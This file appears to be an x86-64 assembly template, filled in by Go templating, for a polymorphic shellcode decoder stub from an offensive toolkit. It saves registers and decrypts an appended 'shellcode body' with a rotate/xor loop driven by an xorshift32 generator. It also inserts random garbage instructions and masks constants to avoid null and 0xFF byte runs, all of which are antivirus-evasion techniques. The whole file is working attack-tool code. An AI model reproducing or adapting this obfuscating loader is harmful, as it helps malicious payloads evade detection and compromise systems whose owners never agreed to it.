.code64

// NOT use registers like r8, r9 for prevent
// appear a lot of instruction prefix about 0x48

// the ret and next labels are used to prevent
// "0x00, 0x00, 0x00" and "0xFF, 0xFF, 0xFF"
// about call or jmp instructions

// igi means insert garbage instruction
// igs means insert garbage instruction with short version

// rax store the random seed
// rbx store the crypto key
// rcx store the loop times
// rdx store the xor shift median
// rsi store the body address
// rdi store the current value

header:
  // save context
  push {{.Reg.rax}}                            {{igi}}
  push {{.Reg.rbx}}                            {{igi}}
  push {{.Reg.rcx}}                            {{igi}}
  push {{.Reg.rdx}}                            {{igi}}
  push {{.Reg.rsi}}                            {{igi}}
  push {{.Reg.rdi}}                            {{igi}}
  pushfq                                       {{igi}}

  mov {{.Reg.eax}}, {{hex .Seed}}              {{igi}}
  mov {{.Reg.ebx}}, {{hex .Key}}               {{igi}}

  // prevent continuous 0x00
  mov {{.Reg.ecx}}, {{hex .NumLoopStub}}       {{igi}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskA}}      {{igi}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskB}}      {{igi}}

  // calculate the body address
  lea {{.Reg.rsi}}, [rip + body + {{hex .OffsetT}}]   {{igi}}
  add {{.Reg.rsi}}, {{hex .OffsetA}}                  {{igi}}
  sub {{.Reg.rsi}}, {{hex .OffsetS}}                  {{igi}}

  // decode shellcode body
 loop_xor:
  mov {{.Reg.edi}}, [{{.Reg.rsi}}]             {{igs}}
  ror {{.Reg.edi}}, 17                         {{igs}}
  xor {{.Reg.edi}}, {{.Reg.eax}}               {{igs}}
  rol {{.Reg.edi}}, 7                          {{igs}}
  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{igs}}
  mov [{{.Reg.rsi}}], {{.Reg.edi}}             {{igs}}

  // call xor shift 32
  jmp xor_shift_32                             {{igs}}
 ret_1:

  // update address and counter
  add {{.Reg.rsi}}, 4                          {{igs}}
  dec {{.Reg.ecx}}                             {{igs}}
  jnz loop_xor                                 {{igs}}

  // jump to the loader or shellcode
  jmp restore                                  {{igs}}

xor_shift_32:
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
  shl {{.Reg.edx}}, 13                         {{igs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
  shr {{.Reg.edx}}, 17                         {{igs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
  shl {{.Reg.edx}}, 5                          {{igs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
  jmp ret_1                                    {{igs}}

 restore:
  // restore context
  popfq                                        {{igi}}
  pop {{.Reg.rdi}}                             {{igi}}
  pop {{.Reg.rsi}}                             {{igi}}
  pop {{.Reg.rdx}}                             {{igi}}
  pop {{.Reg.rcx}}                             {{igi}}
  pop {{.Reg.rbx}}                             {{igi}}
  pop {{.Reg.rax}}                             {{igi}}

body:
